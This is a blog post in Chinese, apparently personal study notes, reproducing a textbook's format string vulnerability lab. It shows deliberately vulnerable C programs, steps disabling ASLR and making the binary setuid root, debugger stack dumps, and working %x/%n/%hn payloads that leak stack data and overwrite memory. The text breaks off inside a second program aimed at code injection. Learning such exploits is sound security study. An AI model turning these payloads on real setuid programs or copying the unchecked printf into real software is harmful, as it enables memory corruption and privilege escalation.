            "content_html": "<h2 id=\"备忘\"><a href=\"#备忘\" class=\"headerlink\" title=\"备忘\"></a>备忘</h2><p>1.看一下其他资料、书、博客、datacon的视频等</p>\n<p>2.刷题</p>\n<p>主要是对《计算机安全导论-深度实践》 里面格式化字符串一章节的学习和复现</p>\n<h1 id=\"基础\"><a href=\"#基础\" class=\"headerlink\" title=\"基础\"></a>基础</h1><p>printf等输出函数为什么可以接收任意数量的参数?  就是这么设计的</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-5-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20230217103340659.png\" alt=\"image-20230217103340659\"></p>\n<p>va_list是什么? 如何移动?</p>\n<p>参见《计算机安全导论 深度实践》107页</p>\n<h1 id=\"漏洞程序与利用\"><a href=\"#漏洞程序与利用\" class=\"headerlink\" title=\"漏洞程序与利用\"></a>漏洞程序与利用</h1><p>漏洞程序</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">fmtstr</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> input[<span class=\"number\">100</span>];</span><br><span class=\"line\">\t<span class=\"type\">int</span> var = <span class=\"number\">0x11223344</span>;</span><br><span class=\"line\">  <span class=\"comment\">//输出一些后面要用到的数据</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;target address %x\\n&quot;</span>,(<span class=\"type\">unsigned</span>) &amp;var);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;data at target address:0x%x\\n&quot;</span>,var);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;please enter a string:&quot;</span>);</span><br><span class=\"line\">\tfgets(input, <span class=\"keyword\">sizeof</span>(input)<span class=\"number\">-1</span>,<span class=\"built_in\">stdin</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(input); <span class=\"comment\">//漏洞点在这里</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;data at target address: 0x%x\\n&quot;</span>,var);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tfmtstr();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>gcc -m32 -o vul vul.c 编译32位的</p>\n<p>去除保护需要吗?  -fno-stack-protector                gcc -m32  -fno-stack-protector -o vul vul.c  </p>\n<p>sudo chown root vul</p>\n<p>sudo chmod 4755 vul</p>\n<p>sudo sysctl -w kernel.randomize_va_space&#x3D;0 关闭地址随机化保护</p>\n<h2 id=\"认识程序栈\"><a href=\"#认识程序栈\" class=\"headerlink\" title=\"认识程序栈\"></a>认识程序栈</h2><p>了解程序在栈中的布局非常重要</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-5-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20230217104556343.png\" alt=\"image-20230217104556343\"></p>\n<h2 id=\"输出栈中的数据\"><a href=\"#输出栈中的数据\" class=\"headerlink\" title=\"输出栈中的数据\"></a>输出栈中的数据</h2><p>%x.%x.%x.%x.%x.%x.%x.%x.%x.</p>\n<p>63.f7fbd5c0.565555d9.ffffd5aa.11223344.252e7825.78252e78.2e78252e.252e7825.</p>\n<p>为什么是%x呢? 别的呢? 看基础里面的图,这个是printf的输出格式 ,</p>\n<p>这个顺序是什么顺序呢?从哪里开始呢? 为什么不是格式化字符串地址挨着变量呢?</p>\n<p>刚输入进去的时候是挨着的呀,哦吼,这是从esp下面第一个开始往下打印,<font color=\"red\">所以这里的栈桢结构和上面的图是反着的!!</font></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ esp <span class=\"number\">0xffffd510</span> —▸ <span class=\"number\">0xffffd52c</span> ◂— <span class=\"string\">&#x27;%x.%x.%x.%x.%x.%x.%x.%x.%x.\\n&#x27;</span></span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0004</span>│     <span class=\"number\">0xffffd514</span> ◂— <span class=\"number\">0x63</span> <span class=\"comment\">/* &#x27;c&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0008</span>│     <span class=\"number\">0xffffd518</span> —▸ <span class=\"number\">0xf7fbd5c0</span> (_IO_2_1_stdin_) ◂— <span class=\"number\">0xfbad2288</span></span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">000</span>c│     <span class=\"number\">0xffffd51c</span> —▸ <span class=\"number\">0x56555579</span> (fmtstr+<span class=\"number\">12</span>) ◂— add    ebx, <span class=\"number\">0x1a57</span></span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0010</span>│     <span class=\"number\">0xffffd520</span> —▸ <span class=\"number\">0xffffd55a</span> ◂— <span class=\"number\">0xf4000100</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0014</span>│     <span class=\"number\">0xffffd524</span> —▸ <span class=\"number\">0xf7ffc984</span> (_rtld_global_ro+<span class=\"number\">132</span>) ◂— <span class=\"number\">0x6</span></span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0018</span>│     <span class=\"number\">0xffffd528</span> ◂— <span class=\"number\">0x11223344</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">001</span>c│     <span class=\"number\">0xffffd52c</span> ◂— <span class=\"string\">&#x27;%x.%x.%x.%x.%x.%x.%x.%x.%x.\\n&#x27;</span></span><br><span class=\"line\">pwndbg&gt;</span><br><span class=\"line\"><span class=\"number\">08</span>:<span class=\"number\">0020</span>│  <span class=\"number\">0xffffd530</span> ◂— <span class=\"string\">&#x27;x.%x.%x.%x.%x.%x.%x.%x.\\n</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>在gdb中,直接r,然后输入%x.%x.%x.%x.%x.%x.%x.%x.%x., 就直接运行结束了,没办法看到调试后的效果,这也是自己刚开始很久都不会的调试方法…这种问题应该和同学交流的,搜索引擎也不容易搜到.</p>\n<p>pwndbg&gt; r<br>Starting program: &#x2F;home&#x2F;ubuntu&#x2F;cssec&#x2F;strings&#x2F;vul<br>target address ffffd524<br>data at target address:0x11223344<br>please enter a string:%x.%x.%x.%x.%x.%x.%x.%x.%x.<br>63.f7fbd5c0.565555d9.ffffd55a.11223344.252e7825.78252e78.2e78252e.252e7825.<br>data at target address: 0x11223344<br>[Inferior 1 (process 28953) exited normally</p>\n<p>在它之后下断点就可以了吧 </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   <span class=\"number\">0x5655563d</span> &lt;fmtstr+<span class=\"number\">112</span>&gt;    lea    eax, [ebp - <span class=\"number\">0x70</span>]</span><br><span class=\"line\">   <span class=\"number\">0x56555640</span> &lt;fmtstr+<span class=\"number\">115</span>&gt;    push   eax</span><br><span class=\"line\"> ► <span class=\"number\">0x56555641</span> &lt;fmtstr+<span class=\"number\">116</span>&gt;    call   fgets@plt                    &lt;fgets@plt&gt;</span><br><span class=\"line\">        s: <span class=\"number\">0xffffd528</span> —▸ <span class=\"number\">0xf7ffc988</span> (_rtld_global_ro+<span class=\"number\">136</span>) ◂— <span class=\"number\">0x55</span> <span class=\"comment\">/* &#x27;U&#x27; */</span></span><br><span class=\"line\">        n: <span class=\"number\">0x63</span></span><br><span class=\"line\">        stream: <span class=\"number\">0xf7fbd5c0</span> (_IO_2_1_stdin_) ◂— <span class=\"number\">0xfbad2088</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"number\">0x56555646</span> &lt;fmtstr+<span class=\"number\">121</span>&gt;    add    esp, <span class=\"number\">0x10</span></span><br><span class=\"line\">   <span class=\"number\">0x56555649</span> &lt;fmtstr+<span class=\"number\">124</span>&gt;    sub    esp, <span class=\"number\">0xc</span></span><br><span class=\"line\">   <span class=\"number\">0x5655564c</span> &lt;fmtstr+<span class=\"number\">127</span>&gt;    lea    eax, [ebp - <span class=\"number\">0x7</span></span><br><span class=\"line\">                                           </span><br><span class=\"line\">                                           </span><br><span class=\"line\">可以在这后面直接下断点即可 b *<span class=\"number\">0x56555646</span>  </span><br><span class=\"line\">     </span><br><span class=\"line\">                                           </span><br><span class=\"line\">在fgets输入后得到栈的布局如下                                     </span><br><span class=\"line\">pwndbg&gt; teles</span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ esp     <span class=\"number\">0xffffd510</span> —▸ <span class=\"number\">0xffffd528</span> ◂— <span class=\"string\">&#x27;aaaabbbbccccddddeeeeffff\\n&#x27;</span></span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0004</span>│         <span class=\"number\">0xffffd514</span> ◂— <span class=\"number\">0x63</span> <span class=\"comment\">/* &#x27;c&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0008</span>│         <span class=\"number\">0xffffd518</span> —▸ <span class=\"number\">0xf7fbd5c0</span> (_IO_2_1_stdin_) ◂— <span class=\"number\">0xfbad2288</span></span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">000</span>c│         <span class=\"number\">0xffffd51c</span> —▸ <span class=\"number\">0x565555d9</span> (fmtstr+<span class=\"number\">12</span>) ◂— add    ebx, <span class=\"number\">0x19f3</span></span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0010</span>│         <span class=\"number\">0xffffd520</span> —▸ <span class=\"number\">0xffffd55a</span> ◂— <span class=\"number\">0x9d000100</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0014</span>│         <span class=\"number\">0xffffd524</span> ◂— <span class=\"number\">0x11223344</span></span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0018</span>│ eax ecx <span class=\"number\">0xffffd528</span> ◂— <span class=\"string\">&#x27;aaaabbbbccccddddeeeeffff\\n&#x27;</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">001</span>c│         <span class=\"number\">0xffffd52c</span> ◂— <span class=\"string\">&#x27;bbbbccccddddeeeeffff\\n&#x27;</span></span><br><span class=\"line\">pwndbg&gt;</span><br><span class=\"line\"><span class=\"number\">08</span>:<span class=\"number\">0020</span>│  <span class=\"number\">0xffffd530</span> ◂— <span class=\"string\">&#x27;ccccddddeeeeffff\\n&#x27;</span></span><br><span class=\"line\"><span class=\"number\">09</span>:<span class=\"number\">0024</span>│  <span class=\"number\">0xffffd534</span> ◂— <span class=\"string\">&#x27;ddddeeeeffff\\n&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0</span>a:<span class=\"number\">0028</span>│  <span class=\"number\">0xffffd538</span> ◂— <span class=\"string\">&#x27;eeeeffff\\n&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0b</span>:<span class=\"number\">002</span>c│  <span class=\"number\">0xffffd53c</span> ◂— <span class=\"string\">&#x27;ffff\\n&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0</span>c:<span class=\"number\">0030</span>│  <span class=\"number\">0xffffd540</span> ◂— <span class=\"number\">0xa</span> <span class=\"comment\">/* &#x27;\\n&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">0</span>d:<span class=\"number\">0034</span>│  <span class=\"number\">0xffffd544</span> ◂— <span class=\"number\">0x2c307d</span> <span class=\"comment\">/* &#x27;&#125;0,&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">0</span>e:<span class=\"number\">0038</span>│  <span class=\"number\">0xffffd548</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\">                                        </span><br></pre></td></tr></table></figure>\n\n\n\n<p>或者直接si进去查看就好了,关键是怎么在pwntools中进行关联</p>\n<h4 id=\"这个顺序是什么顺序呢-从哪里开始呢\"><a href=\"#这个顺序是什么顺序呢-从哪里开始呢\" class=\"headerlink\" title=\"这个顺序是什么顺序呢?从哪里开始呢?\"></a>这个顺序是什么顺序呢?从哪里开始呢?</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; ni</span><br><span class=\"line\"><span class=\"number\">63.f</span>7fbd5c0<span class=\"number\">.565555</span>d9.ffffd55a<span class=\"number\">.11223344</span><span class=\"number\">.252e7825</span><span class=\"number\">.78252e78</span><span class=\"number\">.2e78252</span>e<span class=\"number\">.252e7825</span>.</span><br><span class=\"line\"><span class=\"number\">0x56555655</span> in <span class=\"title function_\">fmtstr</span> <span class=\"params\">()</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">00:0000│ esp 0xffffd510 —▸ 0xffffd528 ◂— &#x27;%x.%x.%x.%x.%x.%x.%x.%x.%x.\\n&#x27;</span><br><span class=\"line\">01:0004│     0xffffd514 ◂— 0x63 <span class=\"comment\">/* &#x27;c&#x27; */</span></span><br><span class=\"line\">02:0008│     0xffffd518 —▸ 0<span class=\"title function_\">xf7fbd5c0</span> <span class=\"params\">(_IO_2_1_stdin_)</span> ◂— 0xfbad2288</span><br><span class=\"line\">03:000c│     0xffffd51c —▸ 0<span class=\"title function_\">x565555d9</span> <span class=\"params\">(fmtstr+<span class=\"number\">12</span>)</span> ◂— add    ebx, 0x19f3</span><br><span class=\"line\">04:0010│     0xffffd520 —▸ 0xffffd55a ◂— 0x60000100</span><br><span class=\"line\">05:0014│     0xffffd524 ◂— 0x11223344</span><br><span class=\"line\">06:0018│     0xffffd528 ◂— &#x27;%x.%x.%x.%x.%x.%x.%x.%x.%x.\\n&#x27;</span><br><span class=\"line\">07:001c│     0xffffd52c ◂— &#x27;x.%x.%x.%x.%x.%x.%x.%x.\\n</span><br><span class=\"line\">  </span><br><span class=\"line\">能看到通过%x输出的是从esp的下一个开始,往ebp方向输出</span><br><span class=\"line\">  252e7825 应该是%x.的ascii之类的?????????????/</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"修改内存中的数据\"><a href=\"#修改内存中的数据\" class=\"headerlink\" title=\"修改内存中的数据\"></a>修改内存中的数据</h2><p>​\t\t一开始会觉得很奇怪,printf不是输出东西的吗, 为什么可以修改数据,这就涉及到一些奇奇怪怪的用法了,printf中有一个%n,会把目前已打印出的字符的个数写入内存,数据在内存中保存的本质就是数字,所以这样就可以修改了</p>\n<p>​\t\t</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target address ffffe43c</span><br><span class=\"line\">data at target address:<span class=\"number\">0x11223344</span></span><br><span class=\"line\">Segmentation <span class=\"title function_\">fault</span> <span class=\"params\">(core dumped)</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t为什么会一直报这个错呢???</p>\n<p>​\t64位和32位可以分别调试一下</p>\n<p>x&#x2F;wx 0xffffe3ec<br>0xffffe3ec:\tCannot access memory at address 0xffffe3ec  </p>\n<p>???</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">► <span class=\"number\">0x565555ff</span> &lt;fmtstr+<span class=\"number\">50</span>&gt;    call   <span class=\"built_in\">printf</span>@plt                    &lt;<span class=\"built_in\">printf</span>@plt&gt;</span><br><span class=\"line\">       format: <span class=\"number\">0x56555760</span> ◂— <span class=\"string\">&#x27;target address %x\\n&#x27;</span></span><br><span class=\"line\">       vararg: <span class=\"number\">0xffffd524</span> ◂— <span class=\"number\">0x11223344</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>pwndbg&gt; x&#x2F;wx 0xffffd524<br>0xffffd524:\t0x11223344</p>\n<p>32位可以访问了…</p>\n<p>64位的为什么会崩溃呢? 写入数据的时候 Segmentation fault (core dumped)</p>\n<p>因为不能访问这个地址,为什么不能访问呢? 感觉这个地址有问题,果然,是前面少了东西! 为啥少呢? 和源代码里面的%x有关系吗,gdb也没提示这个呀….</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">2</span>wx <span class=\"number\">0x7fffffffe3e8</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffe3e8</span>:\t<span class=\"number\">0xf7ffe710</span>\t<span class=\"number\">0x11223344</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">2</span>wx <span class=\"number\">0xffffe3ec</span></span><br><span class=\"line\"><span class=\"number\">0xffffe3ec</span>:\tCannot access memory at address <span class=\"number\">0xffffe3ec</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">2</span>wx <span class=\"number\">0x7fffffffe3ec</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffe3ec</span>:\t<span class=\"number\">0x11223344</span>\t<span class=\"number\">0x00000000</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<p>先用试错法,不加%n找到要修改的地址的位置距离va_list指针有几个移动位置(每一个%x会输出一个东西,然后va_list指针移动,我们需要把它移动到存储要修改的内容的地址的地方)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/cssec/strings<span class=\"meta\"># echo $(printf <span class=\"string\">&quot;\\x64\\xd4\\xff\\xff&quot;</span>).%x.%x.%x.%x.%x.%x &gt; input</span></span><br><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/cssec/strings# ./vul32 &lt; input</span><br><span class=\"line\">target address ffffd464</span><br><span class=\"line\">data at target address:<span class=\"number\">0x11223344</span></span><br><span class=\"line\">please enter a <span class=\"built_in\">string</span>:d<span class=\"number\">.63</span>.f7fbd5c0<span class=\"number\">.565555</span>d9.ffffd49a<span class=\"number\">.11223344</span>.ffffd464</span><br><span class=\"line\">data at target address: <span class=\"number\">0x11223344</span></span><br></pre></td></tr></table></figure>\n\n<p>需要移动五个位置才能到ffffd464,5个%x,然后%n把前面的数据写入到这个地址</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/cssec/strings<span class=\"meta\"># echo $(printf <span class=\"string\">&quot;\\x74\\xd5\\xff\\xff&quot;</span>).%x.%x.%x.%x.%x.%n &gt; input</span></span><br><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/cssec/strings# ./vul32 &lt; input</span><br><span class=\"line\">target address ffffd574</span><br><span class=\"line\">data at target address:<span class=\"number\">0x11223344</span></span><br><span class=\"line\">please enter a <span class=\"built_in\">string</span>:t���<span class=\"number\">.63</span>.f7fbd5c0<span class=\"number\">.565555</span>d9.ffffd5aa<span class=\"number\">.11223344</span>.</span><br><span class=\"line\">data at target address: <span class=\"number\">0x2c</span></span><br></pre></td></tr></table></figure>\n\n<p>0x2c 也就是 32 + 12 &#x3D; 44</p>\n<p>44怎么来的呢,遇到%n之前输出了44个字符,5 * 8 &#x3D; 40,这是第 1 3456个输出, 第二个输出是63 也就是两位,</p>\n<p>4 + 2 + 4*8 + 6 &#x3D; 44</p>\n<p>4(\\x64\\xd4\\xff\\xff) + 2(63) + 4 *8  + 6(点) &#x3D; 44 ,就是这一串:t���.63.f7fbd5c0.565555d9.ffffd5aa.11223344.</p>\n<h2 id=\"修改内存中数据为指定值\"><a href=\"#修改内存中数据为指定值\" class=\"headerlink\" title=\"修改内存中数据为指定值\"></a>修改内存中数据为指定值</h2><h3 id=\"修饰符\"><a href=\"#修饰符\" class=\"headerlink\" title=\"修饰符\"></a>修饰符</h3><p>​\t\t这里涉及到指定值的大小问题,如果很大的值肯定不能一直堆字符,用精度或者宽度修饰符来解决</p>\n<p>​\t\techo $(printf “\\x64\\xd4\\xff\\xff”).%.8x.%x.%x.%x.%.10000000x.%n &gt; input</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/cssec/strings<span class=\"meta\"># echo $(printf <span class=\"string\">&quot;\\x64\\xd4\\xff\\xff&quot;</span>).%.8x.%x.%x.%x.%x.%n &gt; input</span></span><br><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/cssec/strings# ./vul32 &lt; input</span><br><span class=\"line\">target address ffffd464</span><br><span class=\"line\">data at target address:<span class=\"number\">0x11223344</span></span><br><span class=\"line\">please enter a <span class=\"built_in\">string</span>:d<span class=\"number\">.00000063</span>.f7fbd5c0<span class=\"number\">.565555</span>d9.ffffd49a<span class=\"number\">.11223344</span>.</span><br><span class=\"line\">data at target address: <span class=\"number\">0x32</span></span><br></pre></td></tr></table></figure>\n\n<p>精度修饰符:</p>\n<p>宽度修饰符:</p>\n<p><font color=\"red\">但是这样做也有问题,需要打印很多字符,耗时耗资源</font>&gt;</p>\n<h3 id=\"更快的办法\"><a href=\"#更快的办法\" class=\"headerlink\" title=\"更快的办法\"></a>更快的办法</h3><p>​\t\t格式规定符的长度修饰符</p>\n<p>​\t\t%n:视参数为4字节整型数</p>\n<p>​\t\t%hn:视参数为2字节短整型数</p>\n<p>​\t\t%hhn:视参数为1字节字符型数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">2b</span>x <span class=\"number\">0xffffd416</span></span><br><span class=\"line\"><span class=\"number\">0xffffd416</span>:     <span class=\"number\">0x22</span>    <span class=\"number\">0x11</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">2b</span>x <span class=\"number\">0xffffd414</span></span><br><span class=\"line\"><span class=\"number\">0xffffd414</span>:     <span class=\"number\">0x44</span>    <span class=\"number\">0x33</span></span><br></pre></td></tr></table></figure>\n\n<p>echo $(printf “\\x66\\xd4\\xff\\xff@@@@\\x64\\xd4\\xff\\xff”)%.8x%.8x%.8x%.8x%.26204x%hn%.4369x%hn &gt; input</p>\n<p>data at target address: 0x6688779</p>\n<h1 id=\"利用格式化字符串漏洞注入恶意代码\"><a href=\"#利用格式化字符串漏洞注入恶意代码\" class=\"headerlink\" title=\"利用格式化字符串漏洞注入恶意代码\"></a>利用格式化字符串漏洞注入恶意代码</h1><p>漏洞源代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">fmtstr</span><span class=\"params\">(<span class=\"type\">char</span> *str)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *framep;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *ret;</span><br><span class=\"line\">\t<span class=\"keyword\">asm</span>(<span class=\"string\">&quot;movl %%ebp,%0&quot;</span> : <span class=\"string\">&quot;=r&quot;</span> (framep));</span><br><span class=\"line\">\tret = framep +<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;the address of the input array: 0x%.8x\\n&quot;</span>,(<span class=\"type\">unsigned</span>)str);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;the value of the frame pointer: 0x%.8x\\n&quot;</span>,(<span class=\"type\">unsigned</span>)framep);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;the value of the return address: 0x%.8x\\n&quot;</span>,*ret);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(str);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;the value of the return address: 0x%.8x\\n&quot;</span>,*ret);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc,<span class=\"type\">char</span> **argv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tFILE *badfile;</span><br><span class=\"line\">\t<span class=\"type\">char</span> str[<span class=\"number\">200</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\tbadfile = fopen(<span class=\"string\">&quot;badfile&quot;</span>,<span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">\tfread(str,<span class=\"keyword\">sizeof</span>(<span class=\"type\">char</span>),<span class=\"number\">200</span>,badfile);</span><br><span class=\"line\">\tfmtstr(str);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span 